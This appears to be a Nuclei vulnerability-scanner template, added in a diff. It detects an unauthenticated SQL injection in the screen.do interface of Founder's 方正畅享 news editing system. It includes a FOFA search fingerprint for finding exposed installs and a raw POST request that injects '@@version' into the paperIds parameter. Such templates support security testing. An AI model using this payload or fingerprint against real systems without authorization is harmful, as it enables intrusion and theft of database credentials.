@@ -1,0 +1,39 @@
+id: fangzheng-screen_do-sql
+
+info:
+  name: 方正畅享全媒体新闻采编系统screen.do接口SQL注入漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/newsedit/newsedit/css/login_1.css"
+      方正畅享全媒体新闻采编系统screen.do接口存在SQL注入安全缺陷。攻击者可未经身份验证构造恶意SQL语句，通过注入点获取数据库敏感数据（包括但不限于管理员凭证、用户隐私信息），在具备高权限条件下可能实现服务器端命令写入，进而控制目标系统。该漏洞可被用于横向渗透或持久化控制等高级攻击场景。
+  reference:
+  - https://mp.weixin.qq.com/s/DTCf9v8j6TtQpEcoKvgh-g?token=1192656222&lang=zh_CN
+  tags: 方正畅享全媒体新闻采编系统
+
+
+
+http:
+- raw:
+  - |
+    POST /newsedit/newsplan/screen.do HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+    Content-Type: application/x-www-form-urlencoded
+    Connection: close
+
+    method=getPaperLayoutList&pageNo=1&pageSize=5&paperDate=2022-11-30&paperIds=123+AND+2675+in+(select+@@version)&terminalType=123
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '转换成数据类型 int 时失败'
+    - 'Microsoft SQL'
+    condition: and
+  - type: status
+    status:
+    - 200
